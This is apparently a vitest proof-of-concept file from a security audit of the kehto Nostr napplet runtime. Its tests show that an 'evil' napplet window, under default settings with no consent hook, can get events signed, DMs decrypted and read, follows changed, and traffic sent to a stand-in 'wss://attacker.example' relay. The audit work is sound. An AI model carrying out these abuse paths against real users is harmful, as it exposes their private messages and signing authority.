/**
 * SECURITY AUDIT PoC — v7.1.0 kehto review (do not ship; delete after audit).
 *
 * Demonstrates DEFAULT (fail-open) behavior when a host app wires kehto without
 * the optional `approve` consent hook:
 *   1. signing arbitrary events (relay.publish path) without any prompt
 *   2. transparent NIP-04 DM decryption for napplet reads without any prompt
 *   3. napplet-directed publish relays (outbox.publish options.relays)
 *   4. silent follow-list (kind 3) mutation via the lists service
 *   5. runtime-level dm.messages returns the adapter's conversations (dm:read) by default
 *
 * These tests exercise the same library code a napplet envelope reaches after
 * the NIP-5D transport (port binding + ACL + firewall), with the ACL left at its
 * permissive default, mirroring createKehtoShellAdapter's wiring.
 */
import { EventStore } from "applesauce-core";
import { finalizeEvent, getPublicKey, kinds, unixNow } from "applesauce-core/helpers";
import type { Filter } from "applesauce-core/helpers";
import type { RelayPool } from "applesauce-relay";
import { PrivateKeySigner } from "applesauce-signers";
import { Subject, firstValueFrom } from "rxjs";
import { describe, expect, it, vi } from "vitest";
import { createRuntime } from "@kehto/runtime";
import type { RelayPoolLike } from "@kehto/shell";
import { createDmService } from "@kehto/services";
import { decryptForNapplet } from "../../foundation/encryption.js";
import { createKehtoSigner } from "../../foundation/signer.js";
import { createListsOptions } from "../../services/lists.js";
import { createOutboxRouter } from "../../services/outbox.js";
import { kehtoAccount$ } from "../../foundation/account.js";
import type { KehtoContext } from "../../types.js";

const alice = new PrivateKeySigner(new Uint8Array(32).fill(1));
const bob = new PrivateKeySigner(new Uint8Array(32).fill(2));
const alicePubkey = getPublicKey(alice.key);

function fakePool() {
  const req$ = new Subject<any>();
  return {
    req$,
    req: vi.fn(() => req$),
    request: vi.fn(),
    publish: vi.fn(async (relays: string[]) => relays.map((from) => ({ from, ok: true }))),
    count: vi.fn(),
  };
}

function createContext(ctx: Partial<KehtoContext> = {}): { context: KehtoContext; pool: ReturnType<typeof fakePool> } {
  const pool = fakePool();
  return {
    pool,
    context: {
      pool: pool as unknown as RelayPool,
      eventStore: new EventStore({ verifyEvent: () => true }),
      ...ctx,
    },
  };
}

describe("audit PoC: signing consent defaults", () => {
  it("PoC 1a: createKehtoSigner signs an arbitrary kind 5 delete with no approve hook", async () => {
    const approve = vi.fn(() => false); // would deny if consulted
    const { context } = createContext({ signer: alice });
    const signer = createKehtoSigner(alice, context, "napp-win-1");
    expect(signer).not.toBeNull();
    // A napplet asks the runtime relay.publish handler to sign whatever it wants.
    const event = await signer!.signEvent({ kind: kinds.EventDeletion, content: "", tags: [["e", "0".repeat(64)]], created_at: 1 });
    expect(event.pubkey).toBe(alicePubkey);
    expect(approve).not.toHaveBeenCalled(); // consent never consulted: fail-open default
  });

  it("PoC 1b: with approve supplied the same request is denied (contrast)", async () => {
    const approve = vi.fn(() => false);
    const { context } = createContext({ signer: alice, approve });
    const signer = createKehtoSigner(alice, context, "napp-win-1");
    await expect(
      signer!.signEvent({ kind: 1, content: "hi", tags: [], created_at: 1 }),
    ).rejects.toThrow("User denied");
    expect(approve).toHaveBeenCalledTimes(1);
    expect(approve.mock.calls[0][0]).toMatchObject({ windowId: "napp-win-1" });
  });

  it("PoC 2: runtime relay.publish signs and publishes without a consent handler", async () => {
    const { context, pool } = createContext({ signer: alice });
    const poolLike: RelayPoolLike = {
      subscription: (urls: string[]) => ({ subscribe: () => ({ unsubscribe() {} }) }),
      publish: async (_urls, event) => {
        (pool.publish as any).mock.results; // not used; record via spy below
      },
      request: () => ({ subscribe: () => ({ unsubscribe() {} }) }),
    };
    const publishSpy = vi.fn(async () => {});
    poolLike.publish = publishSpy as any;
    const runtime = createRuntime({
      sendToNapplet: () => {},
      auth: { getUserPubkey: () => alicePubkey, getSigner: (windowId) => createKehtoSigner(alice, context, windowId) },
      relayPool: {
        // Runtime-level (post-adaptHooks) relay pool shape, as kehto's shell adapter produces.
        subscribe: () => ({ unsubscribe() {} }),
        publish: publishSpy as any,
        isAvailable: () => true,
        selectRelayTier: () => [alicePubkey.slice(0, 8)],
        trackSubscription: () => {},
        untrackSubscription: () => {},
        openScopedRelay: () => {},
        closeScopedRelay: () => {},
        publishToScopedRelay: () => false,
      },
      relayConfig: { addRelay() {}, removeRelay() {}, getRelayConfig: () => ({ discovery: [], super: [], outbox: [] }), getNip66Suggestions: () => [] },
      windowManager: { createWindow: () => null },
      config: { getNappUpdateBehavior: () => "banner" },
      hotkeys: { executeHotkeyFromForward: () => {} },
      workerRelay: { getWorkerRelay: () => null },
      crypto: { verifyEvent: async () => true },
      isDomainAllowed: () => true, // shell grants domains after shell.init; default env advertises relay
    });
    // No consent handler registered (kehto's createKehtoShellAdapter never registers one).
    runtime.sessionRegistry.register("win-attacker", {
      pubkey: "",
      windowId: "win-attacker",
      origin: "null",
      type: "nip5d",
      dTag: "evil",
      aggregateHash: "hash",
      registeredAt: Date.now(),
      instanceId: "i",
      provenance: "nip-5d",
    } as any);
    runtime.handleMessage("win-attacker", {
      type: "relay.publish",
      id: "r1",
      event: { kind: kinds.EventDeletion, content: "", tags: [["e", "1".repeat(64)]], created_at: 1 },
    });
    await vi.waitFor(() => expect(publishSpy).toHaveBeenCalledTimes(1));
    // Runtime-level pool.publish receives the signed event directly.
    const publishedEvent = publishSpy.mock.calls[0][0] as { kind: number; pubkey: string };
    expect(publishedEvent.kind).toBe(kinds.EventDeletion);
    expect(publishedEvent.pubkey).toBe(alicePubkey);
    runtime.destroy();
  });
});

describe("audit PoC: decryption without consent", () => {
  it("PoC 3: kind 4 NIP-04 DM to the user is auto-decrypted for napplet reads", async () => {
    const plaintext = "secret DM body";
    // Bob encrypts to Alice; the DM arrives authored by Bob, p-tagged Alice.
    const ciphertext = await bob.nip04!.encrypt(alicePubkey, plaintext);
    const dmFromBob = finalizeEvent(
      { kind: kinds.EncryptedDirectMessage, content: ciphertext, tags: [["p", alicePubkey]], created_at: 1 },
      bob.key,
    );
    const { context } = createContext({ signer: alice }); // decrypt defaults to true; no consent hook exists
    const result = await decryptForNapplet(context, dmFromBob);
    expect(result.content).toBe(plaintext); // napplet receives plaintext; no approval API was available to call
  });
});

describe("audit PoC: napplet-directed relays and list mutations", () => {
  it("PoC 4: outbox.publish sends the signed event to a napplet-chosen relay", async () => {
    const { context, pool } = createContext({ signer: alice });
    const router = createOutboxRouter({
      eventStore: context.eventStore,
      pool: context.pool,
      signer: alice,
      // approve intentionally omitted: documented default is "signing allowed when omitted"
    });
    const result = await router.publish({ kind: 1, content: "attacker-chosen post", tags: [], created_at: 1 } as any, {
      relays: ["wss://attacker.example"],
    });
    expect(result.ok).toBe(true);
    const publishCalls = (pool.publish as any).mock.calls as [string[], any][];
    expect(publishCalls[0][0]).toContain("wss://attacker.example/");
    expect(publishCalls[0][1].pubkey).toBe(alicePubkey);
  });

  it("PoC 5: lists service adds a follow (kind 3) with no approve hook", async () => {
    const { context, pool } = createContext({ signer: alice });
    const lists = createListsOptions({
      eventStore: context.eventStore,
      pool: context.pool,
      signer: alice,
      timeout: 50,
      fallbackRelays: ["wss://users-outbox.example"],
    });
    const result = await lists.add({ type: "follow-list" }, [{ itemType: "pubkey", value: getPublicKey(bob.key) }], undefined, {
      windowId: "napp-win-1",
    } as any);
    expect(result.ok).toBe(true);
    const publishCalls = (pool.publish as any).mock.calls as [string[], any][];
    expect(publishCalls.length).toBeGreaterThan(0);
    expect(publishCalls[0][1].kind).toBe(kinds.Contacts);
    expect(publishCalls[0][1].tags).toContainEqual(["p", getPublicKey(bob.key)]);
  });
});

describe("audit PoC: runtime dm domain default", () => {
  it("PoC 6: dm.messages is dispatched to the adapter by default (dm:read is granted)", async () => {
    const adapter = {
      status: async () => ({ available: true, ownerPubkey: alicePubkey, implementations: ["fake"], capabilities: ["history"] }),
      conversations: vi.fn(async () => ({ conversations: [], cursor: undefined })),
      messages: vi.fn(async () => ({
        messages: [
          { id: "m1", conversationId: "direct:aaa", senderPubkey: getPublicKey(bob.key), createdAt: 1, content: "hello from bob", status: "received" },
        ],
        cursor: undefined,
      })),
      send: vi.fn(),
      subscribe: vi.fn(async () => ({ subscriptionId: "s1" })),
      unsubscribe: vi.fn(async () => ({ ok: true })),
      close: () => {},
    };
    const dm = createDmService({ adapter: adapter as any });
    const { context } = createContext({ signer: alice });
    const sent: unknown[] = [];
    const runtime = createRuntime({
      services: { dm },
      auth: { getUserPubkey: () => alicePubkey, getSigner: () => null },
      relayPool: {
        getRelayPool: () => null,
        trackSubscription: () => {},
        untrackSubscription: () => {},
        openScopedRelay: () => {},
        closeScopedRelay: () => {},
        publishToScopedRelay: () => false,
        selectRelayTier: () => [],
      },
      relayConfig: { addRelay() {}, removeRelay() {}, getRelayConfig: () => ({ discovery: [], super: [], outbox: [] }), getNip66Suggestions: () => [] },
      windowManager: { createWindow: () => null },
      config: { getNappUpdateBehavior: () => "banner" },
      hotkeys: { executeHotkeyFromForward: () => {} },
      workerRelay: { getWorkerRelay: () => null },
      crypto: { verifyEvent: async () => true },
      isDomainAllowed: (_w, domain) => domain === "dm",
      sendToNapplet: (_w, message) => sent.push(message),
    } as any);
    runtime.sessionRegistry.register("win-attacker", {
      pubkey: "",
      windowId: "win-attacker",
      origin: "null",
      type: "nip5d",
      dTag: "evil",
      aggregateHash: "hash",
      registeredAt: Date.now(),
      instanceId: "i",
      provenance: "nip-5d",
    } as any);
    runtime.handleMessage("win-attacker", { type: "dm.messages", id: "d1" });
    await vi.waitFor(() => expect(sent.some((m) => (m as any).type === "dm.messages.result")).toBe(true));
    const result = sent.find((m) => (m as any).type === "dm.messages.result") as any;
    expect(adapter.messages).toHaveBeenCalled();
    expect(result.messages[0].content).toBe("hello from bob"); // plaintext handed to the napplet window
    runtime.destroy();
    void context;
  });
});

describe("audit PoC: napplet-directed relay connections", () => {
  it("PoC 7: relay.subscribe honors the napplet's m.relay and connects the host pool to it", async () => {
    const { context } = createContext({ signer: alice });
    const subscribeSpy = vi.fn((_filters: unknown, _cb: unknown, relayUrls?: string[]) => ({
      unsubscribe() {},
    }));
    const runtime = createRuntime({
      sendToNapplet: () => {},
      auth: { getUserPubkey: () => alicePubkey, getSigner: (windowId) => createKehtoSigner(alice, context, windowId) },
      relayPool: {
        subscribe: subscribeSpy as any,
        publish: async () => {},
        isAvailable: () => true,
        selectRelayTier: () => ["wss://host-chosen.example"],
        trackSubscription: () => {},
        untrackSubscription: () => {},
        openScopedRelay: () => {},
        closeScopedRelay: () => {},
        publishToScopedRelay: () => false,
      },
      relayConfig: { addRelay() {}, removeRelay() {}, getRelayConfig: () => ({ discovery: [], super: [], outbox: [] }), getNip66Suggestions: () => [] },
      windowManager: { createWindow: () => null },
      config: { getNappUpdateBehavior: () => "banner" },
      hotkeys: { executeHotkeyFromForward: () => {} },
      workerRelay: { getWorkerRelay: () => null },
      crypto: { verifyEvent: async () => true },
      isDomainAllowed: () => true,
    } as any);
    runtime.sessionRegistry.register("win-attacker", {
      pubkey: "",
      windowId: "win-attacker",
      origin: "null",
      type: "nip5d",
      dTag: "evil",
      aggregateHash: "hash",
      registeredAt: Date.now(),
      instanceId: "i",
      provenance: "nip-5d",
    } as any);
    runtime.handleMessage("win-attacker", {
      type: "relay.subscribe",
      subId: "s1",
      filters: [{ kinds: [0], authors: [alicePubkey] }],
      relay: "wss://attacker.example",
    });
    await vi.waitFor(() => expect(subscribeSpy).toHaveBeenCalledTimes(1));
    // The host's relay pool (and therefore any NIP-42 AUTH identity) is pointed at the attacker relay.
    expect(subscribeSpy.mock.calls[0][2]).toEqual(["wss://attacker.example"]);
    runtime.destroy();
    void context;
  });
});

// keep the unused filter import referenced for future PoCs
void (0 as unknown as (f: Filter[]) => void);
void firstValueFrom;
